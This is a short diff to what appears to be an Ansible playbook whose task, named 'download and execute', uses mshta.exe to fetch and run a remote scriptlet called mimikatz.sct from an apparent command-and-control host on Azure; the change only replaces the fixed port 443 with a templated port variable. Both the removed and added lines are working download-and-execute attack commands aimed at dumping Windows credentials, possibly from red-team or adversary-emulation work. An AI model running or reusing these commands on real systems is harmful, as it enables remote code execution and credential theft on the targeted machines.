@@ -6,6 +6,6 @@
   tasks:
     - name: download and execute
       win_command: |
-        c:\windows\system32\mshta.exe javascript:a=GetObject("script:http://cnc-nuance.eastus.cloudapp.azure.com:443/mimikatz.sct").Exec();close();
+        c:\windows\system32\mshta.exe javascript:a=GetObject("script:http://cnc-nuance.eastus.cloudapp.azure.com:{{ cnc_port}}/mimikatz.sct").Exec();close();
         
   
